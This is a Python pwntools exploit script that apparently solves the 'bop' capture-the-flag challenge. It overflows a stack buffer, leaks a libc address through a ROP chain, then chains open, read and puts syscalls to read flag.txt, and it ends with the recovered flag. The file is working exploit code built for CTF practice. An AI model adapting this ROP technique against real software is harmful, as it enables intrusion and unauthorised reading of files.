#!/usr/bin/env python3
from pwn import *

# Definitions
e = context.binary = ELF('./bop', checksec=False)
libc = ELF('./libc-2.31.so', checksec=False)
context.terminal = ['terminator','-e']

if args.REMOTE:
    io = remote('mc.ax', 30284)
else:
    io = process(e.path)

# Exploit
def pwn():
    
    # Constants
    write_mem = 0x404100
    pop_rdi = 0x4013d3
    ret = 0x40101a
    main = 0x4012f9
    sys_read = 0
    sys_write = 1
    sys_open = 2

    # Leak libc - ROP
    payload = 40*b'A'
    payload += p64(ret) # stack alignment
    payload += p64(pop_rdi)
    payload += p64(e.got['printf'])
    payload += p64(e.plt['printf'])
    payload += p64(ret) # stack alignment
    payload += p64(main)

    io.sendlineafter('bop? ', payload)

    libc.address = u64(io.recv(6).ljust(8, b'\0')) - libc.sym['printf']
    log.success(hex(libc.address))

    # More constants
    pop_rax = libc.address + 0x36174
    pop_rsi = libc.address + 0x2601f
    pop_rdx = libc.address + 0x142c92
    syscall = libc.address + 0x630a9

    log.info(hex(syscall))

    # Read flag - ROP
    payload = 40*b'A'
    payload += p64(ret) # stack alignment

    # gets(flag_name)
    payload += p64(pop_rdi)
    payload += p64(write_mem)
    payload += p64(libc.sym['gets'])

    # open(flag_name)
    payload += p64(pop_rdi)
    payload += p64(write_mem)
    payload += p64(pop_rsi)
    payload += p64(0)
    payload += p64(pop_rax)
    payload += p64(sys_open)
    payload += p64(syscall)

    # read(flag_fd, flag, 512)
    payload += p64(pop_rdi)
    payload += p64(3)
    payload += p64(pop_rsi)
    payload += p64(write_mem)
    payload += p64(pop_rdx)
    payload += p64(512)
    payload += p64(pop_rax)
    payload += p64(sys_read)
    payload += p64(syscall)

    # write(1, flag, 512)
    payload += p64(pop_rdi)
    payload += p64(write_mem)
    payload += p64(libc.sym['puts'])

    payload += p64(main)

    io.sendlineafter('bop? ', payload)
    io.sendline('./flag.txt') # Write to gets(flag_name)

pwn()
io.interactive()

# flag: dice{ba_da_ba_da_ba_be_bop_bop_bodda_bope_f8a01d8ec4e2}
